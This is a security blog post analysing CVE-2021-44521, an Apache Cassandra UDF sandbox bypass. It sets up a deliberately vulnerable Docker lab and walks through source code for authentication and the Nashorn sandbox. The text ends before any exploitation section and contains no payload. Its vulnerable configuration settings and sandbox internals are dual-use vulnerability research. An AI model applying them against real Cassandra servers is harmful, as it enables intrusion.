<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>CVE-2021-44521: Apache Cassandra Remote Code Execution - Zeyad Azima</title>
<meta name="description" content="Detailed analysis for Apache Cassandra CVE-2021-44521 Remote Code Execution &amp; Sandbox/Security Bypass. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="CVE-2021-44521: Apache Cassandra Remote Code Execution">
<meta property="og:url" content="http://localhost:5000/security%20research/CVE_2021_44521/">


  <meta property="og:description" content="Detailed analysis for Apache Cassandra CVE-2021-44521 Remote Code Execution &amp; Sandbox/Security Bypass. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/cli5lwxbp2gdc0vmh1sl18yr3.png">





  <meta property="article:published_time" content="2023-05-28T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/security%20research/CVE_2021_44521/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="CVE-2021-44521: Apache Cassandra Remote Code Execution">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-05-28T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-44521: Apache Cassandra Remote Code Execution
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  21 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#what-is-apache-cassandra-">What is Apache Cassandra ?</a>
    <ul>
      <li><a href="#cql">CQL</a></li>
      <li><a href="#udfs">UDFs</a></li>
      <li><a href="#nashorn">Nashorn</a></li>
    </ul>
  </li>
  <li><a href="#testing-lab">Testing Lab</a></li>
  <li><a href="#static-analysis">Static Analysis</a>
    <ul>
      <li><a href="#enable_user_defined_functions_threads">enable_user_defined_functions_threads</a></li>
    </ul>
  </li>
  <li><a href="#exploitation">Exploitation</a></li>
  <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
  <li><a href="#mitigation">Mitigation</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#resources">Resources</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p><code class="language-plaintext highlighter-rouge">CVE-2021-44521</code> is a vulnerability discovered in Apache Cassandra which allow an attacker to achieve remote command execution through <code class="language-plaintext highlighter-rouge">UDFS</code> &amp; bypass the sandbox to execute the code on the server under specific configurations which let the attacker to takeover the server.</p>

<p><strong>CVSS</strong>:(Critical) https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44521&amp;vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&amp;version=3.1&amp;source=NIST</p>

<h1 id="what-is-apache-cassandra-"><strong>What is Apache Cassandra ?</strong></h1>

<p>Apache Cassandra is an open-source distributed NoSQL database management system, Cassandra is highly scalable and can handle large amounts of structured, semi-structured, and unstructured data across multiple data centers, making it a popular choice for big data applications. It uses a decentralized architecture, with no master node, which allows for linear scalability and fault tolerance. Also, It’s highly tunable and configurable, allowing developers to adjust the system to their specific use case and workload.</p>

<h2 id="cql"><strong>CQL</strong></h2>

<p><code class="language-plaintext highlighter-rouge">CQL</code> is a short for Cassandra Query Language, Which is a query language similar to <code class="language-plaintext highlighter-rouge">SQL</code>, but optimized for distributed database environments with support for secondary indexes, materialized views, and batch operations, among other features.</p>

<h2 id="udfs"><strong>UDFs</strong></h2>

<p><code class="language-plaintext highlighter-rouge">UDFs</code> is a short for User-Defined Functions which are functions that can be created and executed by users within a database management system. In our case, Cassandra offers the functionality of creating user-defined-functions (<code class="language-plaintext highlighter-rouge">UDFs</code>) &amp; the <code class="language-plaintext highlighter-rouge">UDFs</code> in Cassandra can be written by default in <code class="language-plaintext highlighter-rouge">Java</code> and <code class="language-plaintext highlighter-rouge">JavaScript</code>.</p>

<h2 id="nashorn"><strong>Nashorn</strong></h2>

<p><code class="language-plaintext highlighter-rouge">Nashorn</code> is a <code class="language-plaintext highlighter-rouge">JavaScript</code> engine that was introduced in <code class="language-plaintext highlighter-rouge">Java 8</code> and it allows users to execute <code class="language-plaintext highlighter-rouge">JavaScript</code> code within a sanbox &amp; It can be used to create and execute <code class="language-plaintext highlighter-rouge">JavaScript</code> based <code class="language-plaintext highlighter-rouge">UDFs</code> in <code class="language-plaintext highlighter-rouge">Java</code> based database management systems by executing it inside of a sandbox.</p>

<h1 id="testing-lab"><strong>Testing Lab</strong></h1>

<p>Now, Let’s setup our testing lab for analysis &amp; We gonna be using Cassandra <code class="language-plaintext highlighter-rouge">4.0.0</code>, But we need to do some modification for the configuration file within the container and create a new image from it then start a container based on our modified one. First we will pull the Cassandra image:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull cassandra:4.0.0
</code></pre></div></div>

<p><img src="/assets/images/4e48f7fb0bcb7601b3d50ae95856f241" alt="" /></p>

<p>Now let’s run <code class="language-plaintext highlighter-rouge">cassandra</code> container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo docker run --name my-cassandra-analysis -d cassandra:4.0.0
</code></pre></div></div>

<p><img src="/assets/images/279caa6bf30e49c92663a8a04213b697" alt="" /></p>

<p>Let’s check if the container is running:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo docker ps -a
</code></pre></div></div>

<p><img src="/assets/images/78422d0d49f36ee79c5e874b19a563d3" alt="" /></p>

<p>We can see the container is running, Now, Let’s open a shell to it and start our modifications:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo docker exec -it CONTAINER_ID bash
</code></pre></div></div>

<p><img src="/assets/images/c0544de11f6a01b245f0b7e19f7cd071" alt="" /></p>

<p>Now, Under <code class="language-plaintext highlighter-rouge">/opt/cassandar</code> we can find the <code class="language-plaintext highlighter-rouge">cassandra.yaml</code>:</p>

<p><img src="/assets/images/fb99be5ad770e4ecaca227408490cb3c" alt="" /></p>

<p>Let’s open <code class="language-plaintext highlighter-rouge">cassandra.yaml</code> and modifiy &amp; add the following lines:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
</code></pre></div></div>

<p>After this save the file and exit the shell. And the time for creating image from our container is came:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo docker commit my-cassandra-4.0.0 cassandra-analysis:latest 
</code></pre></div></div>

<p><img src="/assets/images/8c55a768fbfde7a5c8f91b2a58e9284a" alt="" /></p>

<p>Now, Everything is ready let’s stop the continer and run a new one using our modified image:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo docker run --name my-cassandra-analysis -e "JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n" -p 8000:8000 -d cassandra-analysis:latest
</code></pre></div></div>

<p><img src="/assets/images/1949302dab0ed264b527c58bcc225a28" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">-e JAVA_TOOL_OPTIONS="-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n"</code> is to set a debugging port, So we can perform our dynamic analysis later and the <code class="language-plaintext highlighter-rouge">-p 8000:8000</code> to map the external connections of port <code class="language-plaintext highlighter-rouge">8000</code> into the container. Now, If we execute shell on the container &amp; try to see the configuration file of <code class="language-plaintext highlighter-rouge">cassandra.yaml</code> we can see our modified configurations applied:</p>

<p><img src="/assets/images/193792029a8eaa358e5572128076b53c" alt="" /></p>

<h1 id="static-analysis"><strong>Static Analysis</strong></h1>

<p>If we go again to <code class="language-plaintext highlighter-rouge">cassandra.yaml</code> file we can be able to see that the anonymous access is allowed as <code class="language-plaintext highlighter-rouge">authenticator</code> config is set as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>authenticator: AllowAllAuthenticator
</code></pre></div></div>

<p>And if we go to the cassandra source code we can find a call called <code class="language-plaintext highlighter-rouge">AllowAllAuthenticator</code> under the following path <code class="language-plaintext highlighter-rouge">/src/java/org/apache/cassandra/auth</code>, Let’s take a look and check it out:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class AllowAllAuthenticator implements IAuthenticator
{
    private static final SaslNegotiator AUTHENTICATOR_INSTANCE = new Negotiator();

    public boolean requireAuthentication()
    {
        return false;
    }

    public Set&lt;IResource&gt; protectedResources()
    {
        return Collections.emptySet();
    }

    public void validateConfiguration() throws ConfigurationException
    {
    }

    public void setup()
    {
    }

    public SaslNegotiator newSaslNegotiator(InetAddress clientAddress)
    {
        return AUTHENTICATOR_INSTANCE;
    }

    public AuthenticatedUser legacyAuthenticate(Map&lt;String, String&gt; credentialsData)
    {
        return AuthenticatedUser.ANONYMOUS_USER;
    }

    private static class Negotiator implements SaslNegotiator
    {

        public byte[] evaluateResponse(byte[] clientResponse) throws AuthenticationException
        {
            return null;
        }

        public boolean isComplete()
        {
            return true;
        }

        public AuthenticatedUser getAuthenticatedUser() throws AuthenticationException
        {
            return AuthenticatedUser.ANONYMOUS_USER;
        }
    }
}
</code></pre></div></div>

<p>The class implements the <code class="language-plaintext highlighter-rouge">IAuthenticator</code> interface which is responsible for authenticating clients connecting to <code class="language-plaintext highlighter-rouge">cassandra</code>, the class providing a simple authentication mechanism that allows all connections without need for any credentials, In short words, <code class="language-plaintext highlighter-rouge">Anonymous</code> authentication.Let’s see the intreasted functions as steps happen as the following The <code class="language-plaintext highlighter-rouge">requireAuthentication()</code> function indicates whether authentication is required or no. In this case, it returns false which means authentication is not required. Then <code class="language-plaintext highlighter-rouge">protectedResources()</code> method returns a set of protected resources &amp; since there is no authentication it returns an empty set. After that <code class="language-plaintext highlighter-rouge">legacyAuthenticate()</code> function is used for legacy authentication and It accepts credentials data and returns an <code class="language-plaintext highlighter-rouge">AuthenticatedUser</code> instance. In this case, it always returns the <code class="language-plaintext highlighter-rouge">ANONYMOUS_USER</code> from the <code class="language-plaintext highlighter-rouge">AuthenticatedUser</code> class. Now, If we try to access <code class="language-plaintext highlighter-rouge">cassandra</code> we will be able to see that we logged-in without any asking for credentials:</p>

<p><img src="/assets/images/3858629ccfcedc7cf5e093e1c6be25dc" alt="" /></p>

<p> </p>

<p>Here we can see we are on <code class="language-plaintext highlighter-rouge">cassandra</code> without any asking for credentials. Now, Back to our configurationsm Let’s explain each option in the configurations we apply to understand it more clearly.</p>

<h3 id="enable_user_defined_functions--enable_scripted_user_defined_functions">enable_user_defined_functions &amp; enable_scripted_user_defined_functions</h3>

<p>The <code class="language-plaintext highlighter-rouge">enable_user_defined_functions</code> &amp; <code class="language-plaintext highlighter-rouge">enable_scripted_user_defined_functions</code> options are for enabling the support of <code class="language-plaintext highlighter-rouge">UDFs</code> in both <code class="language-plaintext highlighter-rouge">Java</code> and <code class="language-plaintext highlighter-rouge">Javascript</code>. Now, If we go to <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/cql3/functions/UDFunction.java</code> and take a look on the <code class="language-plaintext highlighter-rouge">UDFs</code> get implementaion. The <code class="language-plaintext highlighter-rouge">UDFunction</code> class provides methods for validating the <code class="language-plaintext highlighter-rouge">UDFs</code> configuration and parameters and ensure that the function definition is correct and compatible with the expected data types.</p>

<p><img src="/assets/images/9708f73eaa11b3c08e743d9bb1a8e846" alt="" /></p>

<p> </p>

<p>Here first we can see that <code class="language-plaintext highlighter-rouge">UDFunction</code> class is declared as abstract and extends the <code class="language-plaintext highlighter-rouge">AbstractFunction</code> class &amp; implements the <code class="language-plaintext highlighter-rouge">ScalarFunction</code> and <code class="language-plaintext highlighter-rouge">SchemaElement</code> interfaces. Them, defines a variable called <code class="language-plaintext highlighter-rouge">logger</code> from <code class="language-plaintext highlighter-rouge">LoggerFactory</code> to log messages, After that a <code class="language-plaintext highlighter-rouge">threadMXBean</code> variable that provides access to the thread management and monitoring <code class="language-plaintext highlighter-rouge">MXBean</code>. Finally, Declaring the follwoing variables:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">argNames</code>: A list of ColumnIdentifier objects representing the names of the function arguments.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">language</code> and <code class="language-plaintext highlighter-rouge">body</code>: Strings representing the language and body of the user-defined function.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">argCodecs</code>: An array of <code class="language-plaintext highlighter-rouge">TypeCodec</code> Object representing the argument codecs for the function.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">returnCodec</code>: A <code class="language-plaintext highlighter-rouge">TypeCodec</code> Object representing the return codec for the function.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">calledOnNullInput</code>: A boolean indicating whether the function is called on null input.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">udfContext</code>: A variable of type <code class="language-plaintext highlighter-rouge">UDFContext</code> which provides context information for the <code class="language-plaintext highlighter-rouge">UDF</code>.</p>
  </li>
</ul>

<p><img src="/assets/images/2548bf65b8b4b70373b9d3564aa426f0" alt="" /></p>

<p>By scrolling more down we can find here a variable named <code class="language-plaintext highlighter-rouge">allowedPatterns</code> which is an array used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the allowed classes/resources that can be loaded by the class loader. Moving to the following lines:</p>

<p><img src="/assets/images/284989788656563947404a49b206906f" alt="" /></p>

<p> </p>

<p>Here we can see a variable named <code class="language-plaintext highlighter-rouge">disallowedPatterns</code> which is an array used for the opposite process of <code class="language-plaintext highlighter-rouge">allowedPatterns</code>, Which here the <code class="language-plaintext highlighter-rouge">disallowedPatterns</code> used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the disallowed classes/resources that can’t be loaded by the class loader.</p>

<p><img src="/assets/images/fc7261fecefb84ec6c258103720be7e4" alt="" /></p>

<p> </p>

<p>In the next lines we can see the following clearly, This is a static function named <code class="language-plaintext highlighter-rouge">secureResource</code> &amp; basically, it’s used to determine whether a given resource is considered secure based on the allowed and disallowed patterns specified in the <code class="language-plaintext highlighter-rouge">allowedPatterns</code> and <code class="language-plaintext highlighter-rouge">disallowedPatterns</code> arrays. First, the function takes a parameter named <code class="language-plaintext highlighter-rouge">resource</code> and as we can guess it will be the required resources to be loaded, After that defines a <code class="language-plaintext highlighter-rouge">While</code> loop to remove forward slashes <code class="language-plaintext highlighter-rouge">/</code> from the resource string by repeatedly calling <code class="language-plaintext highlighter-rouge">substring(1)</code> until the forward slashes are eliminated, Then a <code class="language-plaintext highlighter-rouge">for-each</code> loop happens to iterate through the <code class="language-plaintext highlighter-rouge">allowedPatterns</code> array to check if the <code class="language-plaintext highlighter-rouge">resource</code> starts with any of the allowed patterns and If the resource starts with an allowed pattern it will proceed to check if it is explicitly disallowed by iterating through <code class="language-plaintext highlighter-rouge">disallowedPatterns</code> array to make sure there is no manipulation in the <code class="language-plaintext highlighter-rouge">resource</code> is being used for a bypass. Finally, If the the <code class="language-plaintext highlighter-rouge">resource</code> patterns is disallowed it will return <code class="language-plaintext highlighter-rouge">false</code> with a massage indicating access denial for the resource, If not, then it will return <code class="language-plaintext highlighter-rouge">true</code> indicating that the <code class="language-plaintext highlighter-rouge">resource</code> is considered secure.</p>

<p><img src="/assets/images/2a8983585a56e16eaef81acbc93402d3" alt="" /></p>

<p> </p>

<p>In the above lines in the screenshot, It’s creating a new <code class="language-plaintext highlighter-rouge">ClassLoader</code> Object named <code class="language-plaintext highlighter-rouge">udfClassLoader</code> and initializes it with a new instance of the <code class="language-plaintext highlighter-rouge">UDFClassLoader</code> class, After that it invokes a constructor named <code class="language-plaintext highlighter-rouge">UDFunction</code> which create and initialize a <code class="language-plaintext highlighter-rouge">UDF</code>, The function takes the following parameters:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">name</code>: A <code class="language-plaintext highlighter-rouge">FunctionName</code> object representing the name of the <code class="language-plaintext highlighter-rouge">UDF</code>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">argNames</code>: A list of <code class="language-plaintext highlighter-rouge">ColumnIdentifier</code> objects representing the names of the function arguments.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">argTypes</code>: A list of <code class="language-plaintext highlighter-rouge">AbstractType</code> objects representing the types of the function arguments.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">returnType</code>: An <code class="language-plaintext highlighter-rouge">AbstractType</code> object representing the return type of the function.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">alledOnNullInput</code>: A boolean indicating whether the function is called on null input.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">language</code>: A string representing the language of the <code class="language-plaintext highlighter-rouge">UDF</code>, Wethier is <code class="language-plaintext highlighter-rouge">Java</code> or <code class="language-plaintext highlighter-rouge">JavaScritp</code>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">body</code>: A string representing the body of the <code class="language-plaintext highlighter-rouge">UDF</code>.</p>
  </li>
</ul>

<p>Then, it passes the provided parameters to the other constructor and the <code class="language-plaintext highlighter-rouge">UDHelper.driverType</code> method is called with the <code class="language-plaintext highlighter-rouge">returnType</code> parameter to convert the return type into the corresponding driver type using another helper method.</p>

<p><img src="/assets/images/fbee556e290b240a17e0921a2cffc5a7" alt="" /></p>

<p>In the next lines, Here we can see it invokes a second constructor with the same parameters. After that it invokes the constructor of the superclass <code class="language-plaintext highlighter-rouge">AbstractFunction</code> with <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">argTypes</code>, and <code class="language-plaintext highlighter-rouge">returnType</code> parameters, Then performs an assertion check to ensure that the <code class="language-plaintext highlighter-rouge">argNames</code> list does not contain any duplicate entries. After That, assigning the variables to instance variables of the class. Finally, It retrieves the metadata for the keyspace specified in the name parameter using the <code class="language-plaintext highlighter-rouge">getKeyspaceMetadata</code> method of the <code class="language-plaintext highlighter-rouge">Schema.instance</code> object and creates a new instance of the <code class="language-plaintext highlighter-rouge">UDFContextImpl</code> class &amp; pass the <code class="language-plaintext highlighter-rouge">argNames</code>, <code class="language-plaintext highlighter-rouge">argCodecs</code>, <code class="language-plaintext highlighter-rouge">returnCodec</code>, and <code class="language-plaintext highlighter-rouge">keyspaceMetadata</code> parameters and The results object is assigned to the <code class="language-plaintext highlighter-rouge">udfContext</code> instance variable.</p>

<p><img src="/assets/images/293b4f215b0ef9f3b3b89022d505c663" alt="" /></p>

<p> </p>

<p>Now, We arrived to the funny part in the code where it try to create the <code class="language-plaintext highlighter-rouge">UDF</code>. The <code class="language-plaintext highlighter-rouge">tryCreate</code> method will take the parameters we mentioned before and try to to create the <code class="language-plaintext highlighter-rouge">UDF</code> by passing it to <code class="language-plaintext highlighter-rouge">create()</code> function. If we scroll down to take a look at the function we can see it as the following:</p>

<p><img src="/assets/images/dba600a3230887c9d1c09d7739f8a62a" alt="" /></p>

<p> </p>

<p>The function has a <code class="language-plaintext highlighter-rouge">switch</code> statment to check the language of the <code class="language-plaintext highlighter-rouge">UDF</code>, If it’s <code class="language-plaintext highlighter-rouge">Java</code>, Then it will create the <code class="language-plaintext highlighter-rouge">UDF</code> using the <code class="language-plaintext highlighter-rouge">JavaBasedUDFunction()</code> function which can be found as <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/cql3/functions/JavaBasedUDFunction.java</code> class which represent the <code class="language-plaintext highlighter-rouge">UDF</code> implemention in <code class="language-plaintext highlighter-rouge">Java</code>,If not then it will create it using <code class="language-plaintext highlighter-rouge">ScriptBasedUDFunction()</code> function which can be found as <code class="language-plaintext highlighter-rouge">src/java/org/apache/cassandra/cql3/functions/ScriptBasedUDFunction.java</code> class which represent the <code class="language-plaintext highlighter-rouge">UDF</code> implemention in scripting languages as <code class="language-plaintext highlighter-rouge">JavaScript</code>. If we go to the <code class="language-plaintext highlighter-rouge">ScriptBasedUDFunction.java</code> class we will be able to see the <code class="language-plaintext highlighter-rouge">Nashron</code> sandbox implemention, Let’s discover the class to make everything more clear.</p>

<p><img src="/assets/images/9ad0dc1bf1b8aa5bacda240b6b948ef4" alt="" /></p>

<p> </p>

<p>The class starts with the declaration of two variables <code class="language-plaintext highlighter-rouge">protectionDomain</code> and <code class="language-plaintext highlighter-rouge">accessControlContext</code>, <code class="language-plaintext highlighter-rouge">ProtectionDomain</code> holds information about the protection domain of the class and <code class="language-plaintext highlighter-rouge">AccessControlContext</code> represents the access control context for the class.</p>

<p><img src="/assets/images/8592c862db692dd2d731c20f17806904" alt="" /></p>

<p> </p>

<p>Here it defines the <code class="language-plaintext highlighter-rouge">allowedPackagesArray</code> variable which is an array of strings representing the allowed packages for the <code class="language-plaintext highlighter-rouge">Nashorn</code> script engine. These allowed packages determine which packages and classes are accessible within the sandboxed environment for executing the <code class="language-plaintext highlighter-rouge">UDFs</code> and this inclusion of specific packages ensures that necessary classes and functionalities required by the scripts and the environment are accessible while maintaining security and preventing unauthorized access to sensitive classes or resources.</p>

<p><img src="/assets/images/b8f95ec5698e02707ed0fb55dca7a293" alt="" /></p>

<p> </p>

<p>When we scroll down we can notice The <code class="language-plaintext highlighter-rouge">UDFExecutorService</code> which is a custom executor service used for executing the <code class="language-plaintext highlighter-rouge">UDFs</code> and It takes parameters such as a named thread factory, a class loader <code class="language-plaintext highlighter-rouge">udfClassLoader</code>, a security thread group &amp; a thread initialization function <code class="language-plaintext highlighter-rouge">UDFunction::initializeThread</code> . After that out of the executor we can notice the <code class="language-plaintext highlighter-rouge">NashornScriptEngine</code> declering and <code class="language-plaintext highlighter-rouge">ClassFilter</code> which is an interface used by the <code class="language-plaintext highlighter-rouge">Nashorn</code> script engine.</p>

<p><img src="/assets/images/91d77702582615e545a74a34714fa047" alt="" /></p>

<p> </p>

<p>As we move to the next lines we can see a static block where the <code class="language-plaintext highlighter-rouge">nashorn</code> get initialized. First, It creates an instance of <code class="language-plaintext highlighter-rouge">ScriptEngineManager</code> and named as <code class="language-plaintext highlighter-rouge">scriptEngineManager</code>. Then, It retrieves <code class="language-plaintext highlighter-rouge">Nashorn</code> script engine into <code class="language-plaintext highlighter-rouge">engine</code> variable which is a <code class="language-plaintext highlighter-rouge">ScriptEngine</code> object. After that it checks if the <code class="language-plaintext highlighter-rouge">engine</code> variable is not <code class="language-plaintext highlighter-rouge">null</code>, If it’s not <code class="language-plaintext highlighter-rouge">null</code> it casts the factory of the script engine to <code class="language-plaintext highlighter-rouge">NashornScriptEngineFactory</code>, if it’s <code class="language-plaintext highlighter-rouge">null</code> it assigns <code class="language-plaintext highlighter-rouge">null</code> to the <code class="language-plaintext highlighter-rouge">factory</code> variable. Followed by checking if the factory is not <code class="language-plaintext highlighter-rouge">null</code>. If it’s not <code class="language-plaintext highlighter-rouge">null</code> it will create a new <code class="language-plaintext highlighter-rouge">Nashorn</code> script engine using the factory <code class="language-plaintext highlighter-rouge">getScriptEngine</code> method and pass empty string array, <code class="language-plaintext highlighter-rouge">udfClassLoader</code> as the class loader &amp; the <code class="language-plaintext highlighter-rouge">classFilter</code> as the class filter which defined in the above lines wie discuss before. The <code class="language-plaintext highlighter-rouge">AccessControlContext</code> encapsulates the context in which a set of permissions is checked for access control decisions.</p>

<p><img src="/assets/images/de7c6eadb26da08c410758670434512a" alt="" /></p>

<p> </p>

